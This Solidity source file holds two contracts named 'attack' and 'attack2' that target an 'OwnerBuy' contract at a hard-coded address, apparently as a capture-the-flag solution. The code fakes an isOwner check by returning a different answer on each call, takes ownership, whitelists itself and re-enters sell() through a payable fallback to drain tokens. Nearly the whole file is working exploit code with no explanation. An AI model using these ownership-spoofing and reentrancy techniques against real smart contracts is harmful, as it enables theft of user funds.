pragma solidity ^0.5.0;
import "./OwnerBuy.sol";
contract attack{
    uint public count;
    uint public count2;
    OwnerBuy ownerbuy=OwnerBuy(0xd9145CCE52D386f254917e481eB44e9943F39138);
    function isOwner(address addr) external returns (bool){
        if (count ==0){
            count++;
            return false;
        }else{
            count--;
            return true;
        }
               
    }
     function getowner()public {
        
         ownerbuy.changestatus(address(this));
         ownerbuy.changeOwner();
     }
     function changeowner()public {
         ownerbuy.transferOwnership(0x220866B1A2219f40e72f5c628B65D54268cA3A9D);
     }
     function att1()public{   //执行前地址是0x22
         ownerbuy.buy.value(1)();     //msg.value=1wei
        
         
     }
     function white()public {//执行要把owner拿回来
          ownerbuy.setWhite(address(ownerbuy));
          ownerbuy.setWhite(address(this));
     }
     function att2()public{   
         
            ownerbuy.sell(200);
           
     }
     function finish1()public{
          ownerbuy.finish();
     }
     function money()public payable{

     }
     function()external payable{
         if (count2==0){
             count2++;
            ownerbuy.sell(200);
         }else{

         }
           
     }
}

contract attack2{
       OwnerBuy ownerbuy=OwnerBuy(0xd9145CCE52D386f254917e481eB44e9943F39138);
     function att1()public payable{
         ownerbuy.buy.value(1)();
     }
     function transf(address addr)public{
        ownerbuy.transfer(addr,ownerbuy.balanceOf(address(this)));
     }
       function money()public payable{

     }
}
